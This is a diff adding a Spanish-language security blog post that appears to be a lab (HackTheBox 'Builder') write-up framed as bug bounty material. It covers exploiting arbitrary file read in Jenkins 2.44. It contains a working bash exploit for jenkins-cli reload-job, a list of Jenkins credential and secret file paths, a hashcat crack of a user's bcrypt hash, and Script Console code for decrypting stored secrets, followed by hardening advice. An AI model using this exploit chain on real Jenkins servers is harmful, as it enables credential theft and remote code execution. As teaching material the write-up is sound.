@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Explotación de Jenkins: Lectura Arbitraria de Archivos y Escalada de Privilegios — Joaquin Silvagni</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Space+Mono:ital,wght@0,400;0,700;1,400&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+    <nav>
+        <a class="nav-logo" href="../index.html"><span>~/</span>zsodex</a>
+        <ul class="nav-links">
+            <li><a href="../index.html#ejpt">Cert</a></li>
+            <li><a href="../index.html#blog">Blog</a></li>
+            <li><a href="../index.html#proyectos">Proyectos</a></li>
+            <li><a href="../index.html#skills">Skills</a></li>
+            <li><a href="../index.html#contacto">Contacto</a></li>
+        </ul>
+    </nav>
+    <div class="post-page" style="display:block">
+        <a class="pb" href="../index.html#blog">&larr; Volver al blog</a>
+        <div class="pc2">
+            <div class="ph2">
+                <div class="pm">
+                    <span class="cat-badge" style="background:rgba(251,146,60,.1);color:#fb923c;border:1px solid rgba(251,146,60,.25)">Bug Bounty</span>
+                    <span class="pdate">2025-04-02</span>
+                </div>
+                <h1 class="ph1">Cómo un Bug Bounty de $5,000 Puede Nacer de una Lectura Arbitraria de Archivos en Jenkins</h1>
+                <p class="psum">Explotación de lectura arbitraria de archivos en Jenkins 2.44 vía jenkins-cli, extracción de credenciales cifradas, crackeo con Hashcat y RCE mediante Script Console.</p>
+                <div class="ptr">
+                    <span class="tag">Jenkins</span>
+                    <span class="tag">LFI</span>
+                    <span class="tag">Hashcat</span>
+                    <span class="tag">Bug Bounty</span>
+                </div>
+            </div>
+            <div class="post-content">
+                <p>Jenkins es una plataforma de integración continua ampliamente adoptada en entornos DevOps. Sin embargo, cuando no se implementan medidas de seguridad adecuadas, puede convertirse en un vector de ataque crítico. En este artículo, exploraremos la explotación de una vulnerabilidad de lectura arbitraria de archivos presente en Jenkins (versión 2.44), mediante la cual es posible acceder a información sensible del sistema y escalar privilegios.</p>
+
+                <h2>1. Vulnerabilidad: Lectura Arbitraria de Archivos en Jenkins</h2>
+                <p>En versiones antiguas de Jenkins como la 2.44, se ha identificado una vulnerabilidad que permite la lectura arbitraria de archivos en el sistema mediante la funcionalidad <code>reload-job</code> del <code>jenkins-cli</code>. Este problema surge debido a una validación inadecuada de rutas de archivos.</p>
+
+                <h3>Explotación Básica — Script en Bash:</h3>
+<pre><code>#!/bin/bash
+output=$(java -jar jenkins-cli.jar -s 'http://10.10.11.10:8080/' "reload-job" @"$1" 2>&amp;1)
+result=$(echo "$output" | sed "s/^.*No such item '\(.*\)' exists.*$/\1/")
+echo "$result"</code></pre>
+
+                <p>Ejemplo de uso:</p>
+<pre><code>./exploit.sh /ruta/del/archivo</code></pre>
+
+                <p>Créditos del script: <a href="https://lanzt.github.io/htb/builder" target="_blank" rel="noopener noreferrer">https://lanzt.github.io/htb/builder</a></p>
+
+                <h2>2. Extracción de Archivos Sensibles</h2>
+                <p>Una vez confirmada la vulnerabilidad, se puede acceder a archivos críticos:</p>
+
+                <h3>Archivos de configuración y credenciales:</h3>
+                <ul>
+                    <li><code>/var/jenkins_home/config.xml</code> &rarr; Configuración principal</li>
+                    <li><code>/var/jenkins_home/credentials.xml</code> &rarr; Credenciales almacenadas</li>
+                    <li><code>/var/jenkins_home/secrets/initialAdminPassword</code> &rarr; Contraseña temporal de admin</li>
+                    <li><code>/var/jenkins_home/secrets/master.key</code> &rarr; Clave para descifrar credentials.xml</li>
+                    <li><code>/var/jenkins_home/secrets/hudson.util.Secret</code> &rarr; Clave de cifrado de Jenkins</li>
+                </ul>
+
+                <h3>Archivos de usuarios y autenticación:</h3>
+                <ul>
+                    <li><code>/var/jenkins_home/users/users.xml</code> &rarr; Lista de usuarios registrados</li>
+                    <li><code>/var/jenkins_home/users/&lt;usuario&gt;/config.xml</code> &rarr; Config. por usuario</li>
+                </ul>
+
+                <h3>Archivos de registros y auditoría:</h3>
+                <ul>
+                    <li><code>/var/log/jenkins/jenkins.log</code></li>
+                    <li><code>/var/jenkins_home/jobs/&lt;job&gt;/builds/&lt;build&gt;/log</code></li>
+                </ul>
+
+                <h3>a) Identificación de Usuarios:</h3>
+<pre><code>./exploit.sh /var/jenkins_home/users/users.xml</code></pre>
+
+                <p>Ejemplo de salida:</p>
+<pre><code>&lt;?xml version='1.1' encoding='UTF-8'?&gt;
+&lt;entry&gt;
+  &lt;string&gt;jennifer&lt;/string&gt;
+&lt;/entry&gt;</code></pre>
+
+                <h3>b) Obtención de Credenciales de Usuario:</h3>
+<pre><code>./exploit.sh /var/jenkins_home/users/jennifer_12108429903186576833/config.xml</code></pre>
+
+                <p>Datos obtenidos:</p>
+                <ul>
+                    <li>Usuario: <code>jennifer</code></li>
+                    <li>Hash de contraseña: <code>$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a</code></li>
+                </ul>
+
+                <h2>3. Descifrado de Credenciales con Hashcat</h2>
+                <p>El hash está en formato bcrypt (<code>$2a$</code>), descifrable con Hashcat:</p>
+<pre><code>echo '$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a' &gt; hash.txt
+hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt</code></pre>
+
+                <p>Resultado: <code>princess</code> (contraseña en texto plano).</p>
+
+                <h2>4. Descifrando Credenciales con la Script Console</h2>
+                <p>Jenkins proporciona una Script Console que permite ejecutar código con los mismos privilegios que el servidor. Ruta de acceso: <code>http://&lt;jenkins-server&gt;/script</code></p>
+
+                <p>Jenkins utiliza <code>hudson.util.Secret</code> para cifrar credenciales. Si se encuentran credenciales cifradas en <code>credentials.xml</code>, se pueden descifrar así:</p>
+<pre><code>import jenkins.model.*
+import hudson.util.*
+println Secret.decrypt("{AQAAABAAAAAQ5gvG8Y9M6y...}")</code></pre>
+
+                <h2>5. Escenarios de Explotación Comunes</h2>
+                <ul>
+                    <li>Acceso inicial mediante credenciales débiles (<code>admin:admin</code>)</li>
+                    <li>Lectura arbitraria de archivos vía <code>reload-job</code> &rarr; <code>credentials.xml</code></li>
+                    <li>Ejecución remota de código mediante la Script Console</li>
+                </ul>
+
+                <h2>6. Medidas de Seguridad para Proteger Jenkins</h2>
+                <ul>
+                    <li>Actualizar Jenkins a su versión más reciente y estable.</li>
+                    <li>Restringir el acceso a <code>jenkins-cli</code> y la Script Console.</li>
+                    <li>Implementar autenticación robusta con contraseñas seguras y MFA.</li>
+                    <li>Monitorear registros de actividad para identificar accesos sospechosos.</li>
+                    <li>Deshabilitar plugins innecesarios, reduciendo la superficie de ataque.</li>
+                    <li>Aplicar principio de privilegios mínimos.</li>
+                </ul>
+
+                <h2>Conclusión</h2>
+                <p>Jenkins es una herramienta fundamental para la integración continua, pero su seguridad depende de una configuración y gestión adecuadas. En este análisis, exploramos cómo una vulnerabilidad de lectura arbitraria de archivos puede facilitar la extracción de credenciales, el descifrado de secretos y la escalada de privilegios.</p>
+            </div>
+        </div>
+    </div>
+    <footer><span>&copy; 2025 <span class="fa">Joaquin Silvagni</span> &middot; zSodex</span><span>Built with &#x1F5A4; &middot; GitHub Pages</span></footer>
+</body>
+</html>
